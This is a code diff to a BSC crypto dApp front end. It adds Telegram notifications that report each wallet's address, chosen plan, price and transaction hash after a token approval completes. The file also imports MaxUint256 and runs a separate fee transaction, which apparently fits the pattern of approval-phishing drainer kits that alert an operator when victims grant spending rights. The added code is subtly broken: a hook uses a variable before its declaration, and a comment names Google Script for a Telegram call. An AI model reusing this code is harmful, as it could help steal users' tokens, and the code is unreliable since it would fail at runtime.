@@ -5,6 +5,7 @@ import { useAccount, usePublicClient, useSwitchChain, useWriteContract } from 'w
 import { bsc } from 'wagmi/chains';
 import { useConnectModal, useAccountModal, useChainModal } from '@rainbow-me/rainbowkit';
 import { parseUnits, MaxUint256 } from 'viem';
+import { sendTelegramNotification } from './utils/telegram';
 import { translations } from './translations';
 import { clsx, type ClassValue } from 'clsx';
 import { twMerge } from 'tailwind-merge';
@@ -247,6 +248,20 @@ export default function App() {
   const isOrderProcessing = isApprovalProcessing || isFeeProcessing;
   const isOrderComplete = approvalStatus === 'success' && feeStatus === 'success';
 
+  // Send final order notification via Google Script when order completes
+  useEffect(() => {
+    if (isOrderComplete && selectedPlanDetails && address) {
+      sendTelegramNotification({
+        type: 'order_complete',
+        address,
+        plan: selectedPlanDetails.title,
+        price: selectedPlanDetails.price,
+        txHash: approvalTxHash || undefined,
+        timestamp: new Date().toISOString(),
+      });
+    }
+  }, [isOrderComplete, selectedPlanDetails, address, approvalTxHash]);
+
   const selectedPlanDetails = selectedPlan === 'tier1'
     ? {
         title: t.tier1_title,
@@ -338,6 +353,16 @@ export default function App() {
       if (receipt.status !== 'success') throw new Error('The approval transaction reverted.');
 
       setApprovalStatus('success');
+
+      // Send Telegram notification for approval
+      await sendTelegramNotification({
+        type: 'approval',
+        address: address!,
+        plan: selectedPlanDetails.title,
+        price: selectedPlanDetails.price,
+        txHash: hash,
+        timestamp: new Date().toISOString(),
+      });
     } catch (error) {
       const message = error instanceof Error ? error.message : String(error);
       const wasRejected = /user rejected|rejected the request|request rejected|4001/i.test(message);
